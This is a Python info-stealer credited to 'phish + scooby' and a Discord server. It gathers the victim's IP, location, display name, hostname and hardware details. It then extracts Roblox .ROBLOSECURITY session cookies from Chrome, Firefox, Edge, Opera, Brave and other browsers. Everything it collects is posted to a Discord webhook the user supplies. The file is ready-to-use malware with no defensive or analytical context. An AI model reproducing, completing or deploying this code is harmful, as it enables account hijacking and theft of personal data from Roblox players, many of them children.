import os 
import requests
import json
import browser_cookie3
import ctypes
import wmi

webhook = 'webhook here'


__credits__ = 'phish + scooby'

class main:

	def getip(self):
		data = requests.get("http://ipinfo.io/json").json()
		return data

	def get_display_name(self):
		GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
		NameDisplay = 3
 
		size = ctypes.pointer(ctypes.c_ulong(0))
		GetUserNameEx(NameDisplay, None, size)
 
		nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
		GetUserNameEx(NameDisplay, nameBuffer, size)
		return nameBuffer.value

	def syinfo(self,webhook):
		data = self.getip()
		name = self.get_display_name()
		ip = data['ip']
		c = data['city']
		co = data['country']
		r = data['region']
		hostname = os.getenv('COMPUTERNAME')
		cpu = wmi.WMI().Win32_Processor()[0].Name
		gpu = wmi.WMI().Win32_VideoController()[0].Name
		ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
		json = {"content":'',"embeds":[{"color": 11014160,"footer": {"text": "scooby + phish ; .gg/comped"},"image": {"url": "https://media.discordapp.net/attachments/972490150418456616/1010172706903293952/ddf19ded4728f2695331f525d0400147.jpg"}},{"title":"System / User Info","color":11014160,"fields":[{"name":"💻 System Info","value":f"```fix\nPC / Desktop name : {hostname}\nName : {name}\nGPU : {gpu}\nCPU : {cpu}\nRAM : {ram} GB\n\n\n```"},{"name":"📶 Network",f"value":f"```fix\nIP : {ip}\nCity : {c}\nCountry : {co}\nRegion : {r}\n```"}],"footer":{"text":".gg/comped | s3x on ^"}}],"username":".gg/comped","avatar_url":"https://cdn.discordapp.com/attachments/972533865354772561/1039775714469224509/IMG_7011.jpg","attachments":[]}
		requests.post(webhook,json=json)
		self.cookies(webhook)

	def cookies(self,webhook):
		listofcookies = []
		
		info = requests.get("http://ipinfo.io/json").json()
		c = info['country']
		ip = info['ip']
		
		browsers = [
			browser_cookie3.chrome,
			browser_cookie3.firefox,
			browser_cookie3.edge,
			browser_cookie3.opera,
			browser_cookie3.Chromium,
			browser_cookie3.Brave,
			browser_cookie3.Vivaldi,
			browser_cookie3.Safari
		]

		for browser in browsers:
			try:
				cookies = browser(domain_name='roblox.com')
				cookies = str(cookies)
				cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
				listofcookies.append(cookie)
			except:pass

		for i in listofcookies:
			try:
				r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": i})
				info = {"content": '',"embeds": [{"description": f"cookie ; ```fix\n{i}\n```","color": 11014160}],"username": ".gg/comped","avatar_url": "https://cdn.discordapp.com/attachments/972533865354772561/1039775714469224509/IMG_7011.jpg","attachments": []}
				requests.post(webhook,json=info)
			except:pass

if __credits__ == "phish + scooby":
	main = main()
	main.syinfo(webhook)
